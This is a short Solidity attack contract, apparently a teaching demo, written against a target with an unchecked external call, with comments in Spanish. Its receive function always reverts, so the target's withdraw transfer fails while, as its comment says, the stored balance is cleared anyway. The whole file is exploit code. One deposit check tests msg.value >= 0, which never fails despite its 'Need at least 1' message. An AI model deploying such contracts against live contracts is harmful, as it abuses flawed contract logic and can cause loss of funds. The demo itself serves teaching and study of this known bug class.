// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUncheckedExternalCall {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackUncheckedCall {
    // Variables
    IUncheckedExternalCall public target;

    // Constructor
    constructor(address _target) {
        target = IUncheckedExternalCall(_target);
    }

    // Revertir operación de retirada: devuelve error
    receive() external payable {
        revert("No quiero recibir el credito");
    }
    
    //Función de deposito
    function deposit() public payable {
        require(msg.value >= 0, "Need at least 1");
        target.deposit{value: msg.value}();
    }

    //Función de ataque
    function attack() public payable {
        target.withdraw(); // La transferencia falla, pero se borra el saldo igualmente
    }
}
